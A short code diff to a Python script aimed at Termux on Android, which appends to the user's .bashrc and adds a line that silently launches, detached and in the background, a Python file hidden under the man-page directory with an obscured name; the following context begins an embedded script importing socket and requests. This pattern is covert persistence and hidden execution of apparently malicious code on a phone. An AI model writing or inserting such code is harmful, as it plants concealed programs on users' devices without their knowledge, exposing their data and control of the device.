@@ -112,6 +112,8 @@ with open("/data/data/com.termux/files/home/.bashrc","a") as file :
 
 
 
+os.system("bash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
+
 
 data = """import socket
 import requests
